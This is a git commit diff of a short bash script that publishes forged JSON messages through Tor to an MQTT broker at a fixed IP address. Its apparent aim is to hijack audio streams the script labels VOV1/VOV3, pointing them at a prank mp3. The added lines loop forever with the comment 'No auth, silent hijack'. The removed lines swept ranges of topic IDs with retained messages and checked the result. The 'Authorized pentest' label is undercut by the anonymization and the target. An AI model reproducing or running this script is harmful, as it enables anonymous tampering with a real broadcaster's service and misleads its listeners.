9b0e0c5b46672f9abb9513f46553f48e1b4db2e0
troiarcazzoguardi-dev <troiarcazzoguardi@gmail.com>
2026-01-05 15:03:04 -0500

    Update uh.sh

--- uh.sh
+++ uh.sh
@@ -1,26 +1,11 @@
 #!/bin/bash
-# FORCE_VOV_HIJACK_PEPPE.sh - Nuclear option (Authorized pentest)
+# PEPPE_VOV_NUKE.sh - No auth, silent hijack (Authorized pentest)
 
-PEPPE_URL="https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3"
+PEPPE='{"n":"88171961789418494:s:16","m":"audio/mpeg","u":"https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3"}'
 
-# HIJACK massivo TUTTI i possibili VOV IDs
-for i in {88171961789418494..88171961789418500}; do
-  topic="${i}:s:16"
-  payload='{"n":"'"$i"':s:16","m":"audio/mpeg","u":"'"$PEPPE_URL"'"}'
-  
-  torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$topic" -q -r -m "$payload" &
+while true; do
+  torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "88171961789418494:s:16" -m "$PEPPE" -q
+  torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "88171961789418495:s:16" -m "$PEPPE" -q
+  torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "17541961789418494:s:16" -m "$PEPPE" -q
+  sleep 1
 done
-
-for i in {17541961789418494..17541961789418500}; do
-  topic="${i}:s:16"
-  payload='{"n":"'"$i"':s:16","m":"audio/mpeg","u":"'"$PEPPE_URL"'"}'
-  
-  torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$topic" -q -r -m "$payload" &
-done
-
-echo "💣 50+ Peppe.mp3 streams HIJACKED (VOV1/VOV3)"
-echo "⏳ Aspetta 10s poi check vov3.vov.vn F5"
-
-# Monitor conferma
-sleep 10
-torsocks mosquitto_sub -h 42.1.64.56 -p 1883 -t '#' -C 5 | grep -i "peppe\|brescia"
